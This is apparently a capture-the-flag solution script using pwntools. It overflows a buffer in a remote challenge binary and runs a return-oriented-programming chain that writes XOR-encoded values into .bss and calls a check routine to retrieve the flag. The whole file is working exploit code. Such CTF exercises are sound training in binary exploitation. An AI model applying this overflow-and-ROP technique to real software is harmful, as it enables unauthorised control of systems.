from pwn import *
context.arch = 'amd64'

# 0x00000000004020af : pop rdi ; ret
# 0x0000000000485e8b : pop rdx ; pop rbx ; ret, rbx不太會去動到，所以拿這行當相近的pop rdx
# 0x00000000004337e3 : mov qword ptr [rdi], rdx ; ret
pop_rdi = 0x4020af
pop_rdx_rbx = 0x485e8b
mov_rdi_rdx = 0x4337e3
bss = 0x4c78b8
check = 0x4017b5
ret = 0x40101a

# r = process('./share/chal')
r = remote('10.113.184.121', 10051)
r.recvuntil(b'secret = ')
secret = int(r.recvline().strip(), 16)
print(hex(secret))

val1 = u64(b"kyoumoka") # u64 = unpack 64 bits to int
val1 = val1 ^ secret
val2 = u64(b"waii".ljust(8, b"\x00")) # ljust = left justify, pad with "\x00" to 8 bytes
val2 = val2 ^ secret
ropc = flat([pop_rdi, bss, pop_rdx_rbx, val1, 0, mov_rdi_rdx, pop_rdi, bss+0x8, pop_rdx_rbx, val2, 0, mov_rdi_rdx, pop_rdi, bss, ret, check])
payload = b'a' * 0x28 + ropc
# pause()
r.sendlineafter(b'> ', payload)
r.recvuntil(b'flag = ')
flag = r.recvline().strip()
flag = p64(u64(flag[:8]) ^ val1) + p64(u64(flag[8:0x10]) ^ val2)
log.info(f'flag = {(flag).strip().decode()}')
print(flag)
r.interactive()